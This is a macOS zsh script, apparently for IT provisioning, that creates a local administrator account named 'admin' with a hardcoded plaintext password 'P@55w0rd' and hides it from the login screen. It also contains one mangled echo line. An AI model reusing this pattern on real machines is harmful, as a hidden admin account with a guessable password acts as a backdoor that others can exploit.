#!/bin/zsh

# determine next available UID
highestUID=$( dscl . -list /Users UniqueID | /usr/bin/awk '$2>m {m=$2} END { print m }' )
nextUID=$(( highestUID+1 ))

echo "UID reserved: $nextUID"

# new user account details
username=admin
displayName="Pacemaker Admin"
password="P@55w0rd"
admin="yes"
hidden="yes"

# create the account
/usr/bin/dscl . create "/Users/$username"
/usr/bin/dscl . create "/Users/$username" UserShell /bin/zsh
/usr/bin/dscl . create "/Users/$username" RealName "$displayName" 
/usr/bin/dscl . create "/Users/$username" UniqueID "$nextUID"
/usr/bin/dscl . create "/Users/$username" PrimaryGroupID 20
/usr/bin/dscl . passwd "/Users/$username" "$password"

echo "Account structure created"

# make the account admin, if specified
if [[ "$admin" = "yes" ]]; then
    /usr/bin/dscl . append /Groups/admin GroupMembership "$username"
	echo "added to admin group"
fi

# hide the account, if specified
if [[ "$hidden" = "yes" ]]; then
    /usr/bin/dscl . create "/Users/$username" IsHidden 1
    /usr/bin/dscl . create "/Users/$username" NFSHomeDirectory "/private/var/$username"
echo "added to admin group" Account hidden

else
    /usr/bin/dscl . create "/Users/$username" NFSHomeDirectory "/Users/$username"
fi

echo "Done!"
